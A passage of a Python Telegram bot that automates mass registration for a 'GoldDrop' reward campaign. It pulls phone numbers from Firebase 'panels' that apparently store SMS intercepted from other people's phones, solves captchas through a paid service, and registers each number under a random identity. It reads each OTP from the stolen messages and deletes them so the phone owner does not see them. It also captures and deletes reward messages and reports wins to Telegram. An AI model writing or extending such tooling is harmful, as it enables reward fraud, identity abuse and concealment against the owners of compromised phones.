            hint = "<i>⚠️ SolverCF error: user not found — Apni SolverCF dashboard key dubara copy karke update karein.</i>"
        notify(f"❌ <b>Captcha Failed:</b> +91{phone}\n<code>{err_msg}</code>\n{hint}")
        return {"phone": phone, "status": "captcha_failed", "error": err_msg}

    u_runner.current_step = f"Registering +91{phone} via Direct HTTP API..."
    runner_status.current_step = u_runner.current_step
    log(f"🌐 Triggering HTTP Registration for +91{phone}...", "cyan")

    master_key = str(random.randint(1000000000, 9999999999))
    s = make_session(master_key)

    try:
        r_init, uk, dk = step_init(s, master_key, PINCODE)
        if not uk or not dk:
            err_desc = "Session init failed"
            log(f"❌ {err_desc} for +91{phone}", "red")
            save_processed(phone, "init_failed", panel_url=fb_url, uid=u_key)
            notify(f"❌ <b>Init Failed:</b> +91{phone}")
            return {"phone": phone, "status": "init_failed"}

        step_get_start(s, uk)

        r_reg = step_register(s, uk, dk, name, phone, email, PINCODE, img_payload, captcha_token=c_token)
        reg_status = r_reg.status_code if r_reg else -1
        reg_json = {}
        raw_text_preview = ""
        try:
            raw_text_preview = (r_reg.text or "")[:200]
            raw_resp = r_reg.json().get("resp", "")
            if raw_resp:
                reg_json = json.loads(base64.b64decode(raw_resp).decode())
            else:
                reg_json = r_reg.json()
        except Exception:
            pass

        reg_msg = str(reg_json.get("message") or reg_json.get("error") or "")
        inner_code = reg_json.get("statusCode", reg_status)
        log(f"📩 [REG +91{phone}] HTTP={reg_status} innerCode={inner_code} resp={reg_json or raw_text_preview}", "cyan")
        add_log(f"📩 REG +91{phone}: {reg_msg or reg_status}", uid=u_key)

        is_explicit_fail = (
            reg_status not in (200, 201)
            or (isinstance(inner_code, int) and inner_code not in (200, 201))
            or any(bad in reg_msg.lower() for bad in ("already", "exist", "invalid", "error", "fail", "limit", "captcha", "expired", "blocked"))
        )
        if is_explicit_fail and not ("otp" in reg_msg.lower() and "sent" in reg_msg.lower()):
            err_desc = reg_msg or f"HTTP {reg_status}"
            log(f"❌ Registration rejected for +91{phone}: {err_desc}", "red")
            save_processed(phone, f"reg_rejected: {err_desc[:40]}", panel_url=fb_url, uid=u_key)
            notify(f"❌ <b>Registration Rejected:</b> +91{phone}\n<code>{err_desc}</code>")
            return {"phone": phone, "status": "reg_rejected", "error": err_desc}

    except Exception as e:
        log(f"❌ HTTP Register exception for +91{phone}: {e}", "red")
        save_processed(phone, f"req_exception: {str(e)[:40]}", panel_url=fb_url, uid=u_key)
        notify(f"❌ <b>Request Error:</b> +91{phone}\n<code>{e}</code>")
        return {"phone": phone, "status": "req_exception", "error": str(e)}

    u_runner.current_step = f"Waiting for OTP (+91{phone}) from Firebase..."
    runner_status.current_step = u_runner.current_step
    log(f"✅ Form submitted! Waiting for OTP on Firebase (+91{phone})...", "yellow")
    notify(f"⏳ <b>Form Submitted:</b> +91{phone}\n<i>Firebase par fresh OTP ka wait ho raha hai...</i>")

    otp, msg_key, subpath, body = wait_for_otp(
        firebase_url=fb_url,
        device_id=client_id,
        last_key=last_key,
        timeout=OTP_TIMEOUT,
        active_subpath=active_sub,
        stop_event=stop_event,
        phone=phone,
        baseline_keys=baseline_keys,
        baseline_time=baseline_time
    )

    if not otp:
        log(f"❌ OTP Timeout (+91{phone})", "red")
        save_processed(phone, "otp_timeout", panel_url=fb_url, uid=u_key)
        notify(f"⏰ <b>OTP Timeout:</b> +91{phone}")
        return {"phone": phone, "status": "otp_timeout"}

    log(f"🎯 OTP Received: {otp} for +91{phone}", "green")
    delete_sms_safe(fb_url, client_id, subpath, msg_key, expected_marker=otp)

    u_runner.current_step = f"Verifying OTP {otp} (+91{phone})..."
    runner_status.current_step = u_runner.current_step
    r_v = step_verify_otp(s, uk, dk, otp)

    vres = {}
    try:
        raw_v = r_v.json().get("resp", "")
        if raw_v:
            vres = json.loads(base64.b64decode(raw_v).decode())
        else:
            vres = r_v.json()
    except Exception:
        pass

    v_code = vres.get("statusCode", r_v.status_code if r_v else -1)
    v_msg = vres.get("message", "")

    is_verified = ((v_code == 200) or ("success" in str(v_msg).lower()) or
                   ("congrat" in str(v_msg).lower()) or ("verif" in str(v_msg).lower()) or
                   ("reward" in vres) or ("win_type" in vres))

    if not is_verified:
        save_processed(phone, f"verify_failed: {v_msg[:30]}", panel_url=fb_url, otp=otp, uid=u_key)
        notify(f"❌ <b>Verify Failed:</b> +91{phone}\nOTP: <code>{otp}</code>\nError: <code>{v_msg}</code>")
        return {"phone": phone, "status": "verify_failed", "otp": otp, "detail": v_msg}

    win = vres.get("win_type")
    if not isinstance(win, str):
        win = str(win or "")
    reward = vres.get("reward")
    is_no_win = (win.lower() in ("none", "")) and (reward in (None, "", "null", 0, "0"))

    deducted, rem_pts = deduct_point_on_otp_verified(u_key)
    pts_note = f"\n💳 <b>Point Used:</b> -1 pt (Remaining: <b>{rem_pts} pts</b>)" if deducted else ""

    otp_ver_alert = (
        f"✅ <b>OTP Verified!</b>\n\n"
        f"📱 <b>Phone:</b> <code>+91{phone}</code>\n"
        f"🔑 <b>OTP:</b> <code>{otp}</code>\n"
        f"🎁 <b>Status:</b> {'No Reward' if is_no_win else f'{win} — {reward}'}\n"
        f"🌐 <b>Panel:</b> <code>{fb_url}</code>\n\n"
        f"<i>Devloper by - @Harshitop_19</i>"
    )
    send_alert_bot(otp_ver_alert, chat_id=ALERT_CHAT_ID or chat_id)

    if is_no_win:
        save_processed(phone, "verified_no_reward", panel_url=fb_url, otp=otp, win_type="none", uid=u_key)
        notify(f"✅ <b>Verified:</b> <code>+91{phone}</code> (No Reward)\n🔑 <b>OTP:</b> <code>{otp}</code>{pts_note}")
        log(f"✅ Verified +91{phone} — No Reward won. Shifting immediately to next device.", "yellow")
        return {"phone": phone, "status": "verified_no_reward", "otp": otp}

    save_processed(phone, "success", reward=str(reward or ""), win_type=str(win or "Reward"), panel_url=fb_url, otp=otp, uid=u_key)
    u_runner.today_success += 1
    runner_status.today_success += 1

    log(f"🏆 REWARD DETECTED: {win} = {reward} for +91{phone}!", "green")

    tg_win_alert = (
        f"🎉 <b>GoldDrop REWARD WON!</b> 🏆\n\n"
        f"📱 <b>Phone:</b> <code>+91{phone}</code>\n"
        f"🔑 <b>OTP:</b> <code>{otp}</code>\n"
        f"🎁 <b>Win Type:</b> <b>{win}</b>\n"
        f"💰 <b>Reward:</b> <b>{reward}</b>\n"
        f"🌐 <b>Panel:</b> <code>{fb_url}</code>\n"
        f"👤 <b>Device ID:</b> <code>{client_id}</code>\n\n"
        f"📄 <b>Raw JSON:</b>\n<pre>{json.dumps(vres, indent=2)[:1500]}</pre>\n\n"
        f"<i>Devloper by - @Harshitop_19</i>"
    )
    send_alert_bot(tg_win_alert, chat_id=ALERT_CHAT_ID or chat_id)
    notify(tg_win_alert)

    baseline_rew = _snapshot_latest_keys(fb_url, client_id)
    u_runner.current_step = f"Waiting for Reward SMS (+91{phone})..."
    runner_status.current_step = u_runner.current_step

    r_record = wait_for_reward_sms(
        firebase_url=fb_url,
        device_id=client_id,
        baseline=baseline_rew,
        phone=phone,
        otp=otp,
        win_type=win,
        reward=str(reward or ""),
        chat_id=chat_id,
        notify_cb=notify_cb,
        timeout=REWARD_SMS_TIMEOUT,
        stop_event=stop_event
    )

    reward_text = r_record.get("message", "") if r_record else ""
    return {"phone": phone, "status": "success", "otp": otp, "reward": reward_text or str(reward or ""), "win_type": win}

def run_sequential_scan(chat_id, stop_event, notify_cb, uid=None):
    uid = str(uid or chat_id)
    u_runner = get_user_runner(uid)
    pending_panels = get_pending_panels(uid)
    if not pending_panels:
        notify_cb(chat_id, "⚠️ Koi pending Firebase panels nahi hain. Pehle Firebase links ya .txt file bhejein.")
        with _runner_lock:
            u_runner.is_running = False
            u_runner.current_step = "Idle"
            runner_status.is_running = False
            runner_status.current_step = "Idle"
        return

    total_panels = len(pending_panels)
    add_log(f"🚀 Sequential Scan Started: {total_panels} panel(s) queued", uid=uid)
    notify_cb(chat_id, f"🚀 <b>Sequential Scan Shuru Ho Gaya Hai!</b>\n\n"
                       f"📊 <b>Total Panels:</b> {total_panels}\n"
                       f"🔄 <i>Har Firebase aur har device sequence me complete hoga.</i>")

    with _runner_lock:
        u_runner.is_running = True
        u_runner.chat_id = chat_id
        u_runner.started_at = time.time()
        u_runner.total_panels = total_panels
        runner_status.is_running = True
        runner_status.chat_id = chat_id
        runner_status.started_at = time.time()
        runner_status.total_panels = total_panels

    for p_idx, panel in enumerate(pending_panels, 1):
        if stop_event.is_set():
            add_log("🛑 Scan stopped by user.", uid=uid)
            notify_cb(chat_id, "🛑 <b>Scan stop kar diya gaya hai.</b>")
            break

        pid = panel["id"]
        url = panel["url"]

        with _runner_lock:
            u_runner.current_panel_idx = p_idx
            u_runner.current_panel_url = url
            u_runner.current_step = "Extracting live devices from Firebase..."
            u_runner.current_phone = "-"
            runner_status.current_panel_idx = p_idx
            runner_status.current_panel_url = url
            runner_status.current_step = u_runner.current_step
            runner_status.current_phone = "-"

        add_log(f"[{p_idx}/{total_panels}] Connecting to Panel: {url}", uid=uid)
        notify_cb(chat_id, f"📡 <b>[Panel {p_idx}/{total_panels}]</b> Connecting...\n<code>{url}</code>")

        blocked = blocked_phones(uid=uid)
        devices = extract_devices(url, blocked)

        if not devices:
            add_log(f"[{p_idx}/{total_panels}] No live devices (all dead <= {MIN_FIREBASE_MSGS} msgs or already processed)", uid=uid)
            notify_cb(chat_id, f"⚠️ <b>[Panel {p_idx}/{total_panels}]</b> Koi online live number nahi mila (ya already processed). Panel completed.")
            mark_panel_processed(uid, pid)
            time.sleep(1)
            continue

        total_devs = len(devices)
        add_log(f"[{p_idx}/{total_panels}] Found {total_devs} live device(s). Processing sequentially...", uid=uid)
        notify_cb(chat_id, f"📱 <b>[Panel {p_idx}/{total_panels}]</b> <b>{total_devs} live devices mile!</b>\nDead numbers auto-skipped. Ek-ek karke shuru kar rahe hain...")

        for d_idx, dev in enumerate(devices, 1):
            if stop_event.is_set():
                break

            phone = dev["phone"]
            cid = dev["client_id"]

            with _runner_lock:
                u_runner.current_device_idx = d_idx
                u_runner.total_devices = total_devs
                u_runner.current_phone = f"+91{phone}"
                u_runner.current_step = f"Processing device {d_idx}/{total_devs}..."
                runner_status.current_device_idx = d_idx
                runner_status.total_devices = total_devs
                runner_status.current_phone = f"+91{phone}"
                runner_status.current_step = u_runner.current_step

            add_log(f"[{p_idx}/{total_panels}] ({d_idx}/{total_devs}) +91{phone} -> Starting", uid=uid)

            res = process_single_device(phone, url, cid, chat_id, stop_event, notify_cb, uid=uid)
            add_log(f"[{p_idx}/{total_panels}] ({d_idx}/{total_devs}) +91{phone} -> {res.get('status')}", uid=uid)

            if not stop_event.is_set() and d_idx < total_devs:
                time.sleep(2)

        mark_panel_processed(uid, pid)
        add_log(f"✅ [Panel {p_idx}/{total_panels}] Finished all devices! Shifting to next...", uid=uid)
        notify_cb(chat_id, f"✅ <b>[Panel {p_idx}/{total_panels}] Complete Ho Gaya!</b>\nNext panel par shift kar rahe hain...")
        time.sleep(1)

    with _runner_lock:
        u_runner.is_running = False
        u_runner.current_step = "All queued panels finished"
        runner_status.is_running = False
        runner_status.current_step = "All queued panels finished"

    total_db, succ, rewards, _ = stats_summary(uid=uid)
    add_log(f"🎉 Scan finished. User rewards: {rewards}", uid=uid)
    notify_cb(chat_id, f"🎉 <b>Scan Process Complete Ho Gaya!</b>\n\n"
                       f"🏆 <b>Your Rewards Won:</b> {rewards}\n"
                       f"✅ <b>Your Total Verified:</b> {succ}\n"
                       f"📊 <b>Your Processed Numbers:</b> {total_db}")

def start_telegram_bot():
    try:
        import telebot
        from telebot import types
    except ImportError:
        print("=" * 60)
        print("❌ Error: pyTelegramBotAPI library not found!")
        print("Install it using:")
        print("   pip install pyTelegramBotAPI requests urllib3")
        print("=" * 60)
        sys.exit(1)

    if not BOT_TOKEN or BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("=" * 60)
        print("⚠️ BOT_TOKEN is not configured!")
        print("Set it via:")
        print("   export BOT_TOKEN='your_token'")
        print("or edit BOT_TOKEN inside the script.")
        print("=" * 60)
        sys.exit(1)

    global BATCH_CODE, PINCODE, OTP_TIMEOUT

    bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
    user_states = {}

    try:
        bot_info = bot.get_me()
        BOT_USERNAME = bot_info.username or ""
    except Exception:
        BOT_USERNAME = ""

    def is_admin(uid):
        try:
            return int(uid) in ADMIN_IDS
        except Exception:
            return False

    def get_refer_bonus():
        try:
            return int(get_setting("refer_bonus", "10"))
        except Exception:
            return 10

    def is_force_join_enabled():
        return str(get_setting("force_join", "1")) == "1"

    def is_refer_enabled():
        return str(get_setting("refer_enabled", "1")) == "1"

    def get_missing_channels(uid):
        if is_admin(uid) or not is_force_join_enabled():
            return []
        channels = get_required_channels()
        if not channels:
            return []
        missing = []
        for ch_id, ch_title, ch_link in channels:
            try:
                member = bot.get_chat_member(ch_id, int(uid))
                if member.status in ("left", "kicked"):
                    missing.append((ch_id, ch_title, ch_link))
            except Exception:
                continue
        return missing

    def send_join_prompt(chat_id, missing_channels, edit_msg_id=None):
        markup = types.InlineKeyboardMarkup(row_width=1)
        for idx, (ch_id, ch_title, ch_link) in enumerate(missing_channels, 1):
            label = f"📢 Join {ch_title}" if ch_title else f"📢 Join Channel #{idx}"
            url = ch_link if ch_link and ch_link.startswith("http") else f"https://t.me/{ch_id.lstrip('@')}"
            markup.add(types.InlineKeyboardButton(label, url=url))
        markup.add(types.InlineKeyboardButton("✅ Joined / Verify Membership", callback_data="verify_join"))

        text = (
            "🔒 <b>Channel Join Required!</b>\n\n"
            "Bot use karne se pehle neeche diye gaye sabhi channels join karein.\n"
            "Join karne ke baad <b>'✅ Joined / Verify Membership'</b> button dabayein:\n\n"
            ""
        )
        if edit_msg_id:
            try:
                bot.edit_message_text(text, chat_id=chat_id, message_id=edit_msg_id, reply_markup=markup)
                return
            except Exception:
                pass
        bot.send_message(chat_id, text, reply_markup=markup)

    def check_access(message_or_call, skip_join_check=False):
        user = getattr(message_or_call, "from_user", None)
        if not user:
            return False
        uid = str(user.id)
        register_bot_user(uid, user.username or "", user.first_name or "")
        if not is_admin(uid) and is_user_banned(uid):
            return False
        if not skip_join_check:
            missing = get_missing_channels(uid)
            if missing:
                chat_id = message_or_call.message.chat.id if hasattr(message_or_call, "message") else message_or_call.chat.id
                send_join_prompt(chat_id, missing)
                return False
        return True

    def notify_user(chat_id, text, reply_markup=None):
        try:
            bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup, disable_web_page_preview=True)
        except Exception as e:
            log(f"Error sending message to {chat_id}: {e}", "red")

    def build_reply_keyboard(uid):
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        kb.row("▶️ Start Scan", "🛑 Stop Scan")
        kb.row("➕ Add Firebase", "⚙️ Manage Firebases")
        kb.row("📡 Live Status", "🏆 Rewards / Stats")
        kb.row("🎁 Refer & Earn", "👤 My Profile")
        kb.row("🖼 Image / Photo", "📱 Recent Phones")
        kb.row("📱 Manual Number")
        kb.row("❌ Cancel")
        kb.row("🔑 Captcha Keys", "🆘 Help")
        if is_admin(uid):
            kb.row("👑 Admin Panel")
        return kb

    def build_back_button(uid="default"):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
        return markup

    def render_help_text(uid):
        return (
            f"🆘 <b>Gold Drop Bot Help & Workflow</b>\n\n"
            f"1️⃣ <b>Firebase Add Karein:</b>\n"
            f"   • Single Link paste karein\n"
            f"   • Bulk links paste karein\n"
            f"   • Ya seedha <b>.txt file</b> upload karein!\n\n"
            f"2️⃣ <b>Sequential Scan:</b>\n"
            f"   • Neeche keyboard se <b>'▶️ Start Scan'</b> dabayein.\n"
            f"   • Har user ka data (panels, photo, numbers, stats) alag-alag rehta hai.\n"
            f"   • OTP auto-delete hoga aur reward SMS capture/auto-delete hoga.\n\n"
            f"3️⃣ <b>Refer & Earn:</b>\n"
            f"   • <b>'🎁 Refer & Earn'</b> se apna invite link share karke points earn karein."
        )

    def send_help_screen(chat_id, uid):
        bot.send_message(chat_id, render_help_text(uid), reply_markup=build_reply_keyboard(uid))

    def build_admin_menu():
        users_cnt = len(get_all_bot_users())
        keys_cnt = len(load_captcha_keys())
        ch_cnt = len(get_required_channels())
        fj_status = "ON ✅" if is_force_join_enabled() else "OFF ❌"
        ref_status = "ON ✅" if is_refer_enabled() else "OFF ❌"
        bonus = get_refer_bonus()

        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.row(
            types.InlineKeyboardButton(f"👥 Users ({users_cnt})", callback_data="admin_users_0"),
            types.InlineKeyboardButton("📢 Broadcast Msg", callback_data="admin_prompt_broadcast")
        )
        markup.row(
            types.InlineKeyboardButton("➕ Add Channel", callback_data="admin_prompt_add_ch"),
            types.InlineKeyboardButton(f"➖ Remove Channel ({ch_cnt})", callback_data="admin_channels")
        )
        markup.row(
            types.InlineKeyboardButton("💳 Add Credit", callback_data="admin_prompt_add_credit"),
            types.InlineKeyboardButton("💸 Deduct Credit", callback_data="admin_prompt_deduct_credit")
        )
        markup.row(
            types.InlineKeyboardButton(f"📢 Channels List ({ch_cnt})", callback_data="admin_channels"),
            types.InlineKeyboardButton(f"🔒 Force Join: {fj_status}", callback_data="admin_toggle_force_join")
        )
        markup.row(
            types.InlineKeyboardButton(f"🎁 Refer System: {ref_status}", callback_data="admin_toggle_refer"),
            types.InlineKeyboardButton(f"💰 Refer Bonus ({bonus} pts)", callback_data="admin_prompt_refer_bonus")
        )
        markup.row(
            types.InlineKeyboardButton("🏆 Refer Leaderboard", callback_data="view_leaderboard"),
            types.InlineKeyboardButton(f"🔑 Manage Keys ({keys_cnt})", callback_data="manage_keys_0")
        )
        markup.row(
            types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_prompt_ban"),
            types.InlineKeyboardButton("✅ Unban User", callback_data="admin_prompt_unban")
        )
        markup.row(
            types.InlineKeyboardButton("🏷 Set Batch Code", callback_data="admin_prompt_batch"),
            types.InlineKeyboardButton("📍 Set Pincode", callback_data="admin_prompt_pincode")
        )
        markup.row(
            types.InlineKeyboardButton("⏱ Set OTP Timeout", callback_data="admin_prompt_timeout"),
            types.InlineKeyboardButton("🛑 Force Stop Scan", callback_data="admin_force_stop")
        )
        markup.row(types.InlineKeyboardButton("🧹 Reset Processed DB", callback_data="admin_confirm_reset_db"))
        markup.row(types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
        return markup

    def render_admin_text():
        users = get_all_bot_users()
        active_users = sum(1 for u in users if not u[3])
        banned_users = sum(1 for u in users if u[3])
        total_refs = sum((u[5] or 0) for u in users)
        total_db, succ, rewards, ver_no = stats_summary()
        num_keys = len(load_captcha_keys(uid="default"))
        ch_cnt = len(get_required_channels())
        scan_st = "🟢 RUNNING" if runner_status.is_running else "🟡 IDLE"
        return (
            f"👑 <b>ADMIN CONTROL PANEL</b>\n"
            f"─────────────────────────────\n"
            f"⚡ <b>Scanner State:</b> {scan_st}\n"
            f"👥 <b>Users:</b> {len(users)} (Active: {active_users} | Banned: {banned_users})\n"
            f"🎁 <b>Total Referrals:</b> {total_refs} | <b>Bonus/Refer:</b> {get_refer_bonus()} pts\n"
            f"📢 <b>Required Channels:</b> {ch_cnt} (Force Join: {'ON' if is_force_join_enabled() else 'OFF'})\n"
            f"🔑 <b>SolverCF Keys:</b> {num_keys}\n"
            f"🏷 <b>Batch:</b> <code>{BATCH_CODE}</code> | 📍 <b>Pin:</b> <code>{PINCODE}</code> | ⏱ <code>{OTP_TIMEOUT}s</code>\n"
            f"📊 <b>All-Users DB:</b> {total_db} processed | 🏆 {rewards} wins | ✅ {ver_no} verified\n"
            f"─────────────────────────────\n"
            f""
        )

    def build_channels_admin_keyboard():
        markup = types.InlineKeyboardMarkup()
        channels = get_required_channels()
        for ch_id, ch_title, ch_link in channels:
            markup.row(types.InlineKeyboardButton(f"❌ Remove {ch_title} ({ch_id})", callback_data=f"admin_del_ch|{ch_id}"))
        markup.row(
            types.InlineKeyboardButton("➕ Add Channel", callback_data="admin_prompt_add_ch"),
            types.InlineKeyboardButton("🗑️ Clear All Channels", callback_data="admin_clear_ch")
        )
        markup.row(types.InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel"))
        return markup

    def render_channels_admin_text():
        channels = get_required_channels()
        if not channels:
            body = "⚠️ <i>Abhi koi mandatory channel set nahi hai.</i>\n\n<b>➕ Add Channel</b> dabakar <code>@channelusername</code> ya channel link add karein."
        else:
            lines = []
            for idx, (ch_id, ch_title, ch_link) in enumerate(channels, 1):
                lines.append(f"<b>#{idx}</b> {ch_title} — <code>{ch_id}</code>\n   🔗 {ch_link}")
            body = "\n".join(lines)
        return (
            f"📢 <b>MANDATORY JOIN CHANNELS ({len(channels)})</b>\n"
            f"─────────────────────────────\n"
            f"{body}\n"
            f"─────────────────────────────\n"
            f""
        )

    def render_refer_text(uid):
        prof = get_user_profile(uid)
        refs = prof[6] if prof else 0
        pts = prof[7] if prof else 0
        bonus = get_refer_bonus()
        ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{uid}" if BOT_USERNAME else f"User ID: <code>{uid}</code>"
        return (
            f"🎁 <b>REFER & EARN PROGRAM</b>\n"
            f"─────────────────────────────\n"
            f"👤 <b>Your User ID:</b> <code>{uid}</code>\n"
            f"👥 <b>Your Total Invites:</b> <b>{refs}</b>\n"
            f"💰 <b>Your Total Points:</b> <b>{pts} pts</b>\n"
            f"🎉 <b>Per Refer Bonus:</b> <b>+{bonus} pts</b>\n"
            f"💳 <b>Usage Cost:</b> <b>1 OTP Verified = -1 Point</b>\n\n"
            f"🔗 <b>Your Personal Referral Link:</b>\n"
            f"<code>{ref_link}</code>"
        )

    def build_refer_keyboard(uid):
        markup = types.InlineKeyboardMarkup()
        if BOT_USERNAME:
            ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
            share_url = f"https://t.me/share/url?url={ref_link}&text=Join%20this%20Bot%20now!"
            markup.row(types.InlineKeyboardButton("📤 Share Referral Link", url=share_url))
        markup.row(
            types.InlineKeyboardButton("🏆 Top Referrers", callback_data="view_leaderboard"),
            types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")
        )
        return markup

    def render_leaderboard_text():
        top = get_top_referrers(10)
        if not top:
            return "🏆 <b>TOP REFERRERS LEADERBOARD</b>\n─────────────────────────────\n<i>Abhi tak kisi user ka referral record nahi hai.</i>"
        medals = ["🥇", "🥈", "🥉"]
        lines = ["🏆 <b>TOP REFERRERS LEADERBOARD</b>\n─────────────────────────────"]
        for idx, (u_id, u_name, u_first, r_cnt, pts) in enumerate(top):
            prefix = medals[idx] if idx < 3 else f"<b>#{idx+1}</b>"
            disp = f"@{u_name}" if u_name else (u_first or f"User {u_id}")
            lines.append(f"{prefix} {disp} — <b>{r_cnt}</b> invites (<b>{pts} pts</b>)")
        lines.append("─────────────────────────────")
        return "\n".join(lines)

    def build_manage_keyboard(uid, page=0, per_page=5):
        markup = types.InlineKeyboardMarkup()
        all_p = get_all_panels(uid)
        total_p = len(all_p)

        start_idx = page * per_page
        end_idx = min(start_idx + per_page, total_p)
        current_slice = all_p[start_idx:end_idx]

        del_buttons = []
        for i, p in enumerate(current_slice, start=start_idx + 1):
            del_buttons.append(
                types.InlineKeyboardButton(f"❌ Del #{i}", callback_data=f"del_fb_{p['id']}_{page}")
            )
        for i in range(0, len(del_buttons), 2):
            markup.row(*del_buttons[i:i+2])

        nav_row = []
        total_pages = max(1, (total_p + per_page - 1) // per_page)
        if page > 0:
            nav_row.append(types.InlineKeyboardButton("◀️ Prev", callback_data=f"manage_fb_{page-1}"))
        nav_row.append(types.InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data="noop"))
        if end_idx < total_p:
            nav_row.append(types.InlineKeyboardButton("Next ▶️", callback_data=f"manage_fb_{page+1}"))
        if nav_row:
            markup.row(*nav_row)

        markup.row(
            types.InlineKeyboardButton("🗑️ Clear All Firebases", callback_data="confirm_clear_all_fb"),
            types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")
        )
        return markup

    def build_captcha_keys_keyboard(page=0, per_page=5, uid="default"):
        markup = types.InlineKeyboardMarkup()
        all_k = load_captcha_keys(uid=uid)
        total_k = len(all_k)

        start_idx = page * per_page
        end_idx = min(start_idx + per_page, total_k)
        current_slice = all_k[start_idx:end_idx]

        del_buttons = []
        for i, k in enumerate(current_slice, start=start_idx + 1):
            del_buttons.append(
                types.InlineKeyboardButton(f"❌ Del #{i}", callback_data=f"del_key_{start_idx + i - 1}_{page}")
            )
        for i in range(0, len(del_buttons), 2):
            markup.row(*del_buttons[i:i+2])

        nav_row = []
        total_pages = max(1, (total_k + per_page - 1) // per_page)
        if page > 0:
            nav_row.append(types.InlineKeyboardButton("◀️ Prev", callback_data=f"manage_keys_{page-1}"))
        nav_row.append(types.InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data="noop"))
        if end_idx < total_k:
            nav_row.append(types.InlineKeyboardButton("Next ▶️", callback_data=f"manage_keys_{page+1}"))
        if nav_row:
            markup.row(*nav_row)

        markup.row(
            types.InlineKeyboardButton("➕ Add Key(s)", callback_data="prompt_add_keys"),
            types.InlineKeyboardButton("💰 Check Balance", callback_data="check_keys_balance")
        )
        markup.row(
            types.InlineKeyboardButton("🌐 SolverCF Dashboard", url="https://solvercf.com/dashboard"),
            types.InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")
        )
        markup.row(
            types.InlineKeyboardButton("🗑️ Clear All Keys", callback_data="confirm_clear_all_keys")
        )
        return markup

    def render_live_status_text(uid):
        u_runner = get_user_runner(uid)
        total, pending = panel_counts(uid)
        total_db, succ, rewards, ver_no = stats_summary(uid=uid)
        recent = get_recent_logs(8, uid=uid)

        st = "🟢 <b>RUNNING (Active)</b>" if u_runner.is_running else "🟡 <b>IDLE (Stopped)</b>"
        p_info = (f"[{u_runner.current_panel_idx}/{u_runner.total_panels}] <code>{u_runner.current_panel_url}</code>"
                  if u_runner.is_running else "None")
        d_info = (f"<code>{u_runner.current_phone}</code> ({u_runner.current_device_idx}/{u_runner.total_devices})"
                  if u_runner.is_running else "None")
        cur_step = u_runner.current_step

        logs_formatted = "\n".join(f"• <code>{l}</code>" for l in recent)

        text = (
            f"📡 <b>LIVE SCANNER STATUS & ACTIVITY LOGS</b>\n"
            f"─────────────────────────────\n"
            f"⚡ <b>State:</b> {st}\n"
            f"🏢 <b>Active Panel:</b> {p_info}\n"
            f"📱 <b>Current Device:</b> {d_info}\n"
            f"⚙️ <b>Current Step:</b> <i>{cur_step}</i>\n\n"
            f"📊 <b>Your Stats:</b>\n"
            f"• 🏆 Your Rewards Won: <b>{rewards}</b>\n"
            f"• ✅ Your Verified (No Reward): <b>{ver_no}</b>\n"
            f"• 📋 Your Processed Numbers: <b>{total_db}</b>\n"
            f"• ⏳ Your Pending Panels: <b>{pending}</b> of <b>{total}</b>\n\n"
            f"📜 <b>Your Recent Activity Logs:</b>\n"
            f"{logs_formatted}\n"
            f"─────────────────────────────\n"
            f""
        )
        return text

    def cancel_manual_flow(chat_id, uid, edit_msg_id=None):
        user_states.pop(str(uid), None)
        _manual_sessions.pop(str(uid), None)
        msg_txt = "❌ <b>Manual process cancel kar diya gaya hai.</b>"
        if edit_msg_id:
            try:
                bot.edit_message_text(msg_txt, chat_id=chat_id, message_id=edit_msg_id)
                return
            except Exception:
                pass
        bot.send_message(chat_id, msg_txt, reply_markup=build_reply_keyboard(uid))

    def start_manual_number_flow(message, raw_phone):
        uid = str(message.from_user.id)
        digits = "".join(ch for ch in str(raw_phone or "") if ch.isdigit())
        if len(digits) == 12 and digits.startswith("91"):
            digits = digits[2:]
        if len(digits) != 10 or digits[0] not in "6789":
            bot.reply_to(
                message,
                "⚠️ <b>Invalid Indian Mobile Number!</b>\n\n10-digit number (6/7/8/9 se shuru) bhejein. Example: <code>9876543210</code>",
                reply_markup=build_reply_keyboard(uid)
            )
            return

        img_payload = get_active_image_payload(uid=uid)
        if not img_payload:
            bot.reply_to(
                message,
                "⚠️ <b>Image Missing:</b> Manual number register karne se pehle chat me apni photo upload karein ya base64 paste karein.",
                reply_markup=build_reply_keyboard(uid)
            )
            return

        ok_pts, cur_pts = has_sufficient_points(uid)
        if not ok_pts:
            bot.reply_to(
                message,
                f"⚠️ <b>Insufficient Points!</b>\n\n1 OTP Verified = -1 Point.\n💰 <b>Your Balance:</b> <b>{cur_pts} pts</b>\n🎁 <b>'🎁 Refer & Earn'</b> se points earn karein!",
                reply_markup=build_reply_keyboard(uid)
            )
            return

        if not load_captcha_keys(uid=uid):
            bot.reply_to(
                message,
                "⚠️ <b>Aapki SolverCF Key Missing:</b> Pehle <b>🔑 Captcha Keys</b> se apni SolverCF API key add karein.",
                reply_markup=build_reply_keyboard(uid)
            )
            return

        wait_m = bot.reply_to(message, f"🔐 <b>+91{digits}</b> ke liye Captcha solve aur OTP trigger ho raha hai...")
        name, email = generate_random_identity()
        c_token, _, c_err = solve_turnstile_solvercf(uid=uid)
        if c_err or not c_token:
            bot.edit_message_text(
                f"❌ <b>Captcha Failed:</b> +91{digits}\n<code>{c_err or 'Unknown error'}</code>",
                chat_id=message.chat.id, message_id=wait_m.message_id
            )
            return

        master_key = str(random.randint(1000000000, 9999999999))
        s = make_session(master_key)
        try:
            _, uk, dk = step_init(s, master_key, PINCODE)
            if not uk or not dk:
                bot.edit_message_text(
                    f"❌ <b>Session Init Failed:</b> +91{digits}",
                    chat_id=message.chat.id, message_id=wait_m.message_id
                )
                return
            step_get_start(s, uk)
